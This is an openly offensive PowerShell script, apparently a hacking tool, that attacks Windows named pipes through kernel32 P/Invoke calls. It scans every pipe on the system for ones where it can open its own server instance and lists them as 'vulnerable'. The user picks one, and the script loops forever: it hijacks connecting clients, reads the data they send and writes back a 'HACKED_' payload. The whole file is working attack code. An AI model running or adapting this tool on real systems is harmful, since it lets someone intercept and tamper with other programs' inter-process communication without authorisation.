Add-Type @"
using System;
using System.Runtime.InteropServices;
public class PipeWin {
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode)]
    public static extern IntPtr CreateNamedPipe(string name, uint access, uint mode, uint max, uint outsize, uint insize, uint timeout, IntPtr sec);
    [DllImport("kernel32.dll")]
    public static extern bool ConnectNamedPipe(IntPtr pipe, IntPtr overlapped);
    [DllImport("kernel32.dll")]
    public static extern bool DisconnectNamedPipe(IntPtr pipe);
    [DllImport("kernel32.dll")]
    public static extern bool WriteFile(IntPtr file, byte[] buffer, uint bytes, out uint written, IntPtr overlapped);
    [DllImport("kernel32.dll")]
    public static extern bool ReadFile(IntPtr file, byte[] buffer, uint bytes, out uint read, IntPtr overlapped);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);
}
"@


Write-Host "Search vulnerable PIPE..." -Fore Cyan
Write-Host "========================"

$bad = @()
foreach ($p in (Get-ChildItem "\\.\pipe\")) {
    $name = $p.Name
    $full = "\\.\pipe\$name"
    
    $PIPE_DUPLEX = 0x3
    $PIPE_MSG = 0x4
    $PIPE_READ_MSG = 0x2
    $PIPE_WAIT = 0x0
    
    $h = [PipeWin]::CreateNamedPipe($full, $PIPE_DUPLEX, $PIPE_MSG -bor $PIPE_READ_MSG -bor $PIPE_WAIT, 255, 1024, 1024, 0, [IntPtr]::Zero)
    
    if ([int]$h -ne -1) {
        Write-Host "[+] $name" -Fore Green
        $bad += $name
        [PipeWin]::CloseHandle($h)
    } else {
        Write-Host "    $name" -Fore Gray
    }
}

if ($bad.Count -eq 0) {
    Write-Host "NONE" -Fore Red
    exit
}

Write-Host "`nVuln PIPE: $($bad.Count)" -Fore Yellow
for ($i=0; $i -lt $bad.Count; $i++) {
    Write-Host "$($i+1). $($bad[$i])" -Fore Yellow
}

$choice = Read-Host "`nChoose PIPE to boom (1-$($bad.Count))"
if (-not ($choice -match '^\d+$' -and [int]$choice -ge 1 -and [int]$choice -le $bad.Count)) {
    $choice = 1
}
$target = $bad[[int]$choice-1]

Write-Host "`nBabah: $target" -Fore Red

$count = 0
while ($true) {
    $count++
    Write-Host "[$count] Connect to $target..." -Fore Cyan
    
    $full = "\\.\pipe\$target"
    $PIPE_DUPLEX = 0x3
    $PIPE_MSG = 0x4
    $PIPE_READ_MSG = 0x2
    $PIPE_WAIT = 0x0
    
    $h = [PipeWin]::CreateNamedPipe($full, $PIPE_DUPLEX, $PIPE_MSG -bor $PIPE_READ_MSG -bor $PIPE_WAIT, 255, 4096, 4096, 0, [IntPtr]::Zero)
    
    if ([int]$h -eq -1) {
        Write-Host "PIPE don`t create error" -Fore Red
        Start-Sleep 2
        continue
    }
    
    $ok = [PipeWin]::ConnectNamedPipe($h, [IntPtr]::Zero)
    
    if ($ok -or ([Runtime.InteropServices.Marshal]::GetLastWin32Error() -eq 535)) {
        Write-Host "[$count] Connect to PIPE!" -Fore Green

        $buf = New-Object byte[] 8192
        $read = 0
        $readok = [PipeWin]::ReadFile($h, $buf, 8192, [ref]$read, [IntPtr]::Zero)
        
        if ($readok -and $read -gt 0) {
            $data = [System.Text.Encoding]::ASCII.GetString($buf, 0, $read)
            Write-Host "[$count] Received $read bite: $data" -Fore Cyan
        }
        
        # Пишем свой payload
        $msg = "HACKED_" + (Get-Date -Format "HH:mm:ss")
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($msg)
        $written = 0
        $writeok = [PipeWin]::WriteFile($h, $bytes, $bytes.Length, [ref]$written, [IntPtr]::Zero)
        
        if ($writeok) {
            Write-Host "[$count] Send $written bite: $msg" -Fore Green
        }
        
        [PipeWin]::DisconnectNamedPipe($h)
    }
    
    [PipeWin]::CloseHandle($h)
    Start-Sleep 1
}
